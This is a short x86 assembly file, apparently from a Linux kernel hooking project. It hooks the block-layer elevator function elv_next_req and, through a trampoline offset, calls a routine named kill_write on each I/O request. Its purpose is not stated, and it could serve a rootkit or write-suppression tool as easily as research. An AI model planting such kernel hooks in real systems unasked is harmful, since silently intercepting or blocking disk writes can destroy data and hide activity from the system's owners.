/**
 *  elevator hook code that calls elv_kill_write
 */

#include "common.h"  
#include "linuxaddr.h"  //for linux "kk" symbols

.globl elv_next_req_hook

#define KILL_WRITE_BUF_OFFSET   1600
#define REQ_HOOK_CALL_OFFSET    30

elv_next_req_hook:
    mov     %esp, %ebp      //leave a "trace" of where I am... plus who cares about stack convention
    mov     %esi, %eax      //kept from elv_next_req
    xor     %ebx, %ebx
    add     $TRAMP_BASE, %ebx
    add     $KILL_WRITE_BUF_OFFSET, %ebx
    push    %eax            //push arg for kill_write (request *rq)
    call    %ebx
    pop     %ebx            //clean up old arg
    pop     %ecx            //my ret address is here
    pop     %ebx
    pop     %esi
    pop     %edi            //elv_next_req will pop ebp
    push    %ecx
    ret
